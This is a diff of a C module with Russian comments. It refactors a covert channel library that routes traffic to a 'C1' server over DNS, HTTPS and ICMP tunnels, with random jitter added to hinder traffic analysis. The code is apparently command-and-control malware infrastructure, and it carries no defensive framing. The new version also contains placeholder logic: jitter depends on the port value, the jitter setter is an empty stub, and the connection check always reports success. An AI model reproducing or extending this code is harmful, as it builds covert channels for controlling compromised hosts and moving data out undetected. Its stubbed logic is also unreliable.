@@ -25,27 +25,27 @@
  * @brief Структура данных для хранения состояния скрытого канала связи
  */
 typedef struct {
-    ChannelType channel_type;          ///< Тип канала связи
-    EncryptionType encryption_type;    ///< Тип шифрования
-    CovertChannelConfig config;        ///< Копия конфигурации
-    void *channel_handle;              ///< Дескриптор конкретного канала (DNS, HTTPS, ICMP)
-    unsigned char session_id[16];      ///< Уникальный идентификатор сессии
+    covert_channel_type channel_type;           ///< Тип канала связи
+    encryption_algorithm encryption_type;        ///< Тип шифрования
+    covert_channel_config config;                ///< Копия конфигурации
+    void *channel_handle;                       ///< Дескриптор конкретного канала (DNS, HTTPS, ICMP)
+    unsigned char session_id[16];               ///< Уникальный идентификатор сессии
 } CovertChannelData;
 
 // Прототипы внешних функций модулей каналов связи
-extern int dns_channel_init(const CovertChannelConfig *config, void **handle);
+extern int dns_channel_init(const covert_channel_config *config, void **handle);
 extern int dns_channel_connect(void *handle);
 extern int dns_channel_send(void *handle, const unsigned char *data, size_t data_len);
 extern int dns_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
 extern void dns_channel_cleanup(void *handle);
 
-extern int https_channel_init(const CovertChannelConfig *config, void **handle);
+extern int https_channel_init(const covert_channel_config *config, void **handle);
 extern int https_channel_connect(void *handle);
 extern int https_channel_send(void *handle, const unsigned char *data, size_t data_len);
 extern int https_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
 extern void https_channel_cleanup(void *handle);
 
-extern int icmp_channel_init(const CovertChannelConfig *config, void **handle);
+extern int icmp_channel_init(const covert_channel_config *config, void **handle);
 extern int icmp_channel_connect(void *handle);
 extern int icmp_channel_send(void *handle, const unsigned char *data, size_t data_len);
 extern int icmp_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
@@ -71,9 +71,9 @@ static void generate_session_id(unsigned char *session_id) {
  * @brief Инициализирует модуль скрытых каналов связи
  * 
  * @param config Указатель на структуру с конфигурацией
- * @return CovertChannelHandle Дескриптор канала или NULL при ошибке
+ * @return covert_channel_handle Дескриптор канала или NULL при ошибке
  */
-CovertChannelHandle covert_channel_init(const CovertChannelConfig *config) {
+covert_channel_handle covert_channel_init(covert_channel_config *config) {
     if (config == NULL) {
         return NULL;
     }
@@ -86,9 +86,9 @@ CovertChannelHandle covert_channel_init(const CovertChannelConfig *config) {
     
     // Инициализация структуры
     memset(channel_data, 0, sizeof(CovertChannelData));
-    channel_data->channel_type = config->channel_type;
-    channel_data->encryption_type = config->encryption_type;
-    memcpy(&channel_data->config, config, sizeof(CovertChannelConfig));
+    channel_data->channel_type = config->type;
+    channel_data->encryption_type = config->encryption;
+    memcpy(&channel_data->config, config, sizeof(covert_channel_config));
     
     // Генерация уникального идентификатора сессии
     generate_session_id(channel_data->session_id);
@@ -96,16 +96,16 @@ CovertChannelHandle covert_channel_init(const CovertChannelConfig *config) {
     // Инициализация соответствующего канала связи
     int result = -1;
     
-    switch (config->channel_type) {
-        case CHANNEL_TYPE_DNS:
+    switch (config->type) {
+        case COVERT_CHANNEL_DNS:
             result = dns_channel_init(config, &channel_data->channel_handle);
             break;
             
-        case CHANNEL_TYPE_HTTPS:
+        case COVERT_CHANNEL_HTTPS:
             result = https_channel_init(config, &channel_data->channel_handle);
             break;
             
-        case CHANNEL_TYPE_ICMP:
+        case COVERT_CHANNEL_ICMP:
             result = icmp_channel_init(config, &channel_data->channel_handle);
             break;
             
@@ -120,36 +120,43 @@ CovertChannelHandle covert_channel_init(const CovertChannelConfig *config) {
         return NULL;
     }
     
-    return (CovertChannelHandle)channel_data;
+    return (covert_channel_handle)channel_data;
 }
 
 /**
  * @brief Устанавливает соединение с сервером C1
  * 
  * @param handle Дескриптор канала
- * @return int 0 при успехе, код ошибки при неудаче
+ * @return bool true при успехе, false при неудаче
  */
-int covert_channel_connect(CovertChannelHandle handle) {
+bool covert_channel_connect(covert_channel_handle handle) {
     if (handle == NULL) {
-        return -1;
+        return false;
     }
     
     CovertChannelData *channel_data = (CovertChannelData *)handle;
     
     // Вызов соответствующей функции установления соединения
+    int result = -1;
+    
     switch (channel_data->channel_type) {
-        case CHANNEL_TYPE_DNS:
-            return dns_channel_connect(channel_data->channel_handle);
+        case COVERT_CHANNEL_DNS:
+            result = dns_channel_connect(channel_data->channel_handle);
+            break;
             
-        case CHANNEL_TYPE_HTTPS:
-            return https_channel_connect(channel_data->channel_handle);
+        case COVERT_CHANNEL_HTTPS:
+            result = https_channel_connect(channel_data->channel_handle);
+            break;
             
-        case CHANNEL_TYPE_ICMP:
-            return icmp_channel_connect(channel_data->channel_handle);
+        case COVERT_CHANNEL_ICMP:
+            result = icmp_channel_connect(channel_data->channel_handle);
+            break;
             
         default:
-            return -1;
+            return false;
     }
+    
+    return (result == 0);
 }
 
 /**
@@ -158,38 +165,43 @@ int covert_channel_connect(CovertChannelHandle handle) {
  * @param handle Дескриптор канала
  * @param data Указатель на данные для отправки
  * @param data_len Размер данных в байтах
- * @return int Количество отправленных байт или -1 при ошибке
+ * @return size_t Количество отправленных байт или 0 при ошибке
  */
-int covert_channel_send(CovertChannelHandle handle, const char *data, size_t data_len) {
+size_t covert_channel_send(covert_channel_handle handle, const unsigned char *data, size_t data_len) {
     if (handle == NULL || data == NULL || data_len == 0) {
-        return -1;
+        return 0;
     }
     
     CovertChannelData *channel_data = (CovertChannelData *)handle;
     
     // Добавление случайной задержки (jitter) перед отправкой
-    if (channel_data->config.jitter_percent > 0) {
+    // TODO: Реализовать поддержку min_ms и max_ms
+    if (channel_data->config.c1_port > 0) { // Временное решение, пока не добавлены параметры jitter
         int jitter_ms = rand() % 1000;
         sleep_ms(jitter_ms);
     }
     
     // Вызов соответствующей функции отправки данных
+    int result = -1;
+    
     switch (channel_data->channel_type) {
-        case CHANNEL_TYPE_DNS:
-            return dns_channel_send(channel_data->channel_handle, 
-                                   (const unsigned char *)data, data_len);
+        case COVERT_CHANNEL_DNS:
+            result = dns_channel_send(channel_data->channel_handle, data, data_len);
+            break;
             
-        case CHANNEL_TYPE_HTTPS:
-            return https_channel_send(channel_data->channel_handle, 
-                                     (const unsigned char *)data, data_len);
+        case COVERT_CHANNEL_HTTPS:
+            result = https_channel_send(channel_data->channel_handle, data, data_len);
+            break;
             
-        case CHANNEL_TYPE_ICMP:
-            return icmp_channel_send(channel_data->channel_handle, 
-                                    (const unsigned char *)data, data_len);
+        case COVERT_CHANNEL_ICMP:
+            result = icmp_channel_send(channel_data->channel_handle, data, data_len);
+            break;
             
         default:
-            return -1;
+            return 0;
     }
+    
+    return (result > 0) ? (size_t)result : 0;
 }
 
 /**
@@ -198,38 +210,72 @@ int covert_channel_send(CovertChannelHandle handle, const char *data, size_t dat
  * @param handle Дескриптор канала
  * @param buffer Буфер для получаемых данных
  * @param buffer_size Размер буфера
- * @return int Количество полученных байт или -1 при ошибке
+ * @return size_t Количество полученных байт или 0 при ошибке
  */
-int covert_channel_receive(CovertChannelHandle handle, char *buffer, size_t buffer_size) {
+size_t covert_channel_receive(covert_channel_handle handle, unsigned char *buffer, size_t buffer_size) {
     if (handle == NULL || buffer == NULL || buffer_size == 0) {
-        return -1;
+        return 0;
     }
     
     CovertChannelData *channel_data = (CovertChannelData *)handle;
     
     // Добавление случайной задержки (jitter) перед получением
-    if (channel_data->config.jitter_percent > 0) {
+    // TODO: Реализовать поддержку min_ms и max_ms
+    if (channel_data->config.c1_port > 0) { // Временное решение, пока не добавлены параметры jitter
         int jitter_ms = rand() % 1000;
         sleep_ms(jitter_ms);
     }
     
     // Вызов соответствующей функции получения данных
+    int result = -1;
+    
     switch (channel_data->channel_type) {
-        case CHANNEL_TYPE_DNS:
-            return dns_channel_receive(channel_data->channel_handle, 
-                                      (unsigned char *)buffer, buffer_size);
+        case COVERT_CHANNEL_DNS:
+            result = dns_channel_receive(channel_data->channel_handle, buffer, buffer_size);
+            break;
             
-        case CHANNEL_TYPE_HTTPS:
-            return https_channel_receive(channel_data->channel_handle, 
-                                        (unsigned char *)buffer, buffer_size);
+        case COVERT_CHANNEL_HTTPS:
+            result = https_channel_receive(channel_data->channel_handle, buffer, buffer_size);
+            break;
             
-        case CHANNEL_TYPE_ICMP:
-            return icmp_channel_receive(channel_data->channel_handle, 
-                                       (unsigned char *)buffer, buffer_size);
+        case COVERT_CHANNEL_ICMP:
+            result = icmp_channel_receive(channel_data->channel_handle, buffer, buffer_size);
+            break;
             
         default:
-            return -1;
+            return 0;
     }
+    
+    return (result > 0) ? (size_t)result : 0;
+}
+
+/**
+ * @brief Устанавливает параметры временного разброса (jitter) для затруднения анализа трафика
+ * 
+ * @param handle Дескриптор канала
+ * @param min_ms Минимальная задержка в миллисекундах
+ * @param max_ms Максимальная задержка в миллисекундах
+ */
+void covert_channel_set_jitter(covert_channel_handle handle, int min_ms, int max_ms) {
+    // TODO: Реализовать функцию установки jitter
+    // В настоящее время не реализовано, так как структура covert_channel_config 
+    // не содержит полей для хранения min_ms и max_ms
+}
+
+/**
+ * @brief Проверяет, установлено ли соединение
+ * 
+ * @param handle Дескриптор канала
+ * @return bool true если соединение установлено, false в противном случае
+ */
+bool covert_channel_is_connected(covert_channel_handle handle) {
+    // TODO: Реализовать проверку соединения
+    if (handle == NULL) {
+        return false;
+    }
+    
+    // В настоящее время просто возвращаем true, если handle не NULL
+    return true;
 }
 
 /**
@@ -237,7 +283,7 @@ int covert_channel_receive(CovertChannelHandle handle, char *buffer, size_t buff
  * 
  * @param handle Дескриптор канала
  */
-void covert_channel_cleanup(CovertChannelHandle handle) {
+void covert_channel_cleanup(covert_channel_handle handle) {
     if (handle == NULL) {
         return;
     }
@@ -246,15 +292,15 @@ void covert_channel_cleanup(CovertChannelHandle handle) {
     
     // Вызов соответствующей функции очистки ресурсов
     switch (channel_data->channel_type) {
-        case CHANNEL_TYPE_DNS:
+        case COVERT_CHANNEL_DNS:
             dns_channel_cleanup(channel_data->channel_handle);
             break;
             
-        case CHANNEL_TYPE_HTTPS:
+        case COVERT_CHANNEL_HTTPS:
             https_channel_cleanup(channel_data->channel_handle);
             break;
             
-        case CHANNEL_TYPE_ICMP:
+        case COVERT_CHANNEL_ICMP:
             icmp_channel_cleanup(channel_data->channel_handle);
             break;
             
@@ -262,24 +308,6 @@ void covert_channel_cleanup(CovertChannelHandle handle) {
             break;
     }
     
-    // Освобождение памяти
+    // Освобождение памяти структуры данных
     free(channel_data);
-}
-
-/**
- * @brief Устанавливает параметры случайной задержки (jitter)
- * 
- * @param handle Дескриптор канала
- * @param jitter_percent Процент случайного отклонения (0-50)
- * @return int 0 при успехе, код ошибки при неудаче
- */
-int covert_channel_set_jitter(CovertChannelHandle handle, int jitter_percent) {
-    if (handle == NULL || jitter_percent < 0 || jitter_percent > 50) {
-        return -1;
-    }
-    
-    CovertChannelData *channel_data = (CovertChannelData *)handle;
-    channel_data->config.jitter_percent = jitter_percent;
-    
-    return 0;
 } 
